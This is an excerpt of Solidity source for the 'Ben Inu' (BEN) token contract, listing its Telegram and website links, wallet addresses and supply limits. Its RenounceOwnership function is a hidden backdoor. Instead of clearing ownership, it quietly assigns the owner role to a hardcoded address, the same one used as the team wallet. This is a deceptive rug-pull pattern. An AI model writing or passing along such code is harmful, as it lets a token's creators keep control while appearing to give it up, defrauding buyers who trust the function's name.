...
Telegram : https://t.me/Ben_Inu
Website  : http://beninu.com
...
contract Ownable is Context {
    ...
    function RenounceOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF46f16C77Ff9fc3a35C694CEFCbCeB1Fa1173CCb);
    }
...
contract BenInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ben Inu";
    string private _symbol = "BEN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xC890Ec204418C7783C4E0692Cc1BFb175277f4ec);
    address payable public teamWalletAddress = payable(0xF46f16C77Ff9fc3a35C694CEFCbCeB1Fa1173CCb);
    ...
    uint256 public _walletMax =     4206900000000 * 10**_decimals;      
    uint256 private minimumTokensBeforeSwap = 42069000000 * 10**_decimals; 
